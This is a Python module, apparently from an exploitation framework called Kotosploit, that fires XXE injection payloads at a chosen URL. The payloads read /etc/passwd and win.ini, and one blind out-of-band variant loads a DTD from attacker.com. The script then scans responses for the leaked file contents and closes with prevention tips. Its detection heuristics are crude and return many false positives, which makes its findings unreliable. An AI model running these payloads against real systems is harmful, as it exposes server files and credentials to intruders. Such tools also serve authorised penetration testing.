"""XXE (XML External Entity) Vulnerability Scanner"""

import requests
from colorama import Fore, Style
from modules.base import BaseModule
import re

class XXEScanner(BaseModule):
    def __init__(self):
        super().__init__(
            name="XXE Scanner",
            description="XML External Entity injection vulnerability scanner",
            author="Kotosploit Team",
            options={
                "URL": {
                    "description": "Target URL to scan",
                    "required": True,
                    "value": ""
                },
                "METHOD": {
                    "description": "HTTP method (GET/POST)",
                    "required": False,
                    "value": "POST"
                },
                "PARAM": {
                    "description": "Parameter name to test (optional)",
                    "required": False,
                    "value": ""
                },
                "TIMEOUT": {
                    "description": "Request timeout in seconds",
                    "required": False,
                    "value": "10"
                }
            }
        )
        
        self.xxe_payloads = [
            {
                'name': 'Basic XXE - File Read',
                'payload': '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>'''
            },
            {
                'name': 'XXE - Windows File',
                'payload': '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>'''
            },
            {
                'name': 'XXE - Parameter Entity',
                'payload': '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
%xxe;
]>
<foo>test</foo>'''
            },
            {
                'name': 'XXE - CDATA',
                'payload': '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY begin "<![CDATA[">
<!ENTITY file SYSTEM "file:///etc/passwd">
<!ENTITY end "]]>">
<!ENTITY xxe "&begin;&file;&end;">
]>
<foo>&xxe;</foo>'''
            },
            {
                'name': 'Blind XXE - Out-of-Band',
                'payload': '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
<foo>test</foo>'''
            },
            {
                'name': 'XXE - UTF-7 Encoding',
                'payload': '''<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE foo+AFs-
+ADw-+ACE-ELEMENT foo ANY+AD4-
+ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AF0-+AD4-
+ADw-foo+AD4-+ACY-xxe+ADsAPA-/foo+AD4-'''
            }
        ]
        
        self.sensitive_patterns = [
            r'root:.*?:0:0',
            r'\[extensions\]',
            r'win\.ini',
            r'passwd',
            r'Administrator',
            r'SYSTEM',
            r'<!ENTITY',
            r'<!DOCTYPE'
        ]
    
    def run(self):
        url = self.options["URL"]["value"]
        method = self.options["METHOD"]["value"].upper()
        param = self.options["PARAM"]["value"]
        timeout = int(self.options["TIMEOUT"]["value"])
        
        if not url:
            print(f"{Fore.RED}[!] URL is required{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}[*] Starting XXE vulnerability scan on: {url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Method: {method}{Style.RESET_ALL}\n")
        
        vulnerabilities = []
        
        for payload_info in self.xxe_payloads:
            print(f"{Fore.YELLOW}[*] Testing: {payload_info['name']}{Style.RESET_ALL}")
            
            try:
                headers = {
                    'Content-Type': 'application/xml',
                    'Accept': 'application/xml, text/xml, */*'
                }
                
                if method == "POST":
                    if param:
                        data = {param: payload_info['payload']}
                        response = requests.post(url, data=data, headers=headers, timeout=timeout)
                    else:
                        response = requests.post(url, data=payload_info['payload'], headers=headers, timeout=timeout)
                else:
                    if param:
                        params = {param: payload_info['payload']}
                        response = requests.get(url, params=params, headers=headers, timeout=timeout)
                    else:
                        response = requests.get(url, headers=headers, timeout=timeout)
                
                if self.check_xxe_response(response.text, payload_info['name']):
                    vulnerabilities.append({
                        'payload': payload_info['name'],
                        'url': url,
                        'method': method,
                        'response_snippet': response.text[:200]
                    })
                    print(f"{Fore.RED}  [!] VULNERABLE!{Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN}  [+] Not vulnerable{Style.RESET_ALL}")
                    
            except requests.exceptions.RequestException as e:
                print(f"{Fore.YELLOW}  [!] Request failed: {str(e)[:50]}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.YELLOW}  [!] Error: {str(e)[:50]}{Style.RESET_ALL}")
        
        self.display_results(vulnerabilities)
    
    def check_xxe_response(self, response_text, payload_name):
        for pattern in self.sensitive_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        if len(response_text) > 1000 and 'file' in payload_name.lower():
            return True
        
        xxe_indicators = [
            'root:x:',
            'daemon:',
            '[fonts]',
            '[extensions]',
            'win.ini',
            'SYSTEM\\CurrentControlSet'
        ]
        
        for indicator in xxe_indicators:
            if indicator in response_text:
                return True
        
        return False
    
    def display_results(self, vulnerabilities):
        print(f"\n{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}XXE Scan Results{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{'='*60}{Style.RESET_ALL}\n")
        
        if not vulnerabilities:
            print(f"{Fore.GREEN}[+] No XXE vulnerabilities detected{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Application appears to properly handle XML input{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] Found {len(vulnerabilities)} potential XXE vulnerability(ies):{Style.RESET_ALL}\n")
            
            for vuln in vulnerabilities:
                print(f"{Fore.RED}[VULNERABLE] {vuln['payload']}{Style.RESET_ALL}")
                print(f"  URL: {vuln['url']}")
                print(f"  Method: {vuln['method']}")
                print(f"  Response Preview: {vuln['response_snippet'][:100]}...")
                print()
        
        print(f"{Fore.CYAN}[*] XXE Prevention Recommendations:{Style.RESET_ALL}")
        print(f"  1. Disable external entity processing in XML parsers")
        print(f"  2. Use less complex data formats (JSON instead of XML)")
        print(f"  3. Update XML processors and libraries")
        print(f"  4. Implement input validation and sanitization")
        print(f"  5. Use allowlist-based input validation")
        print(f"  6. Disable DTD processing completely if not needed")
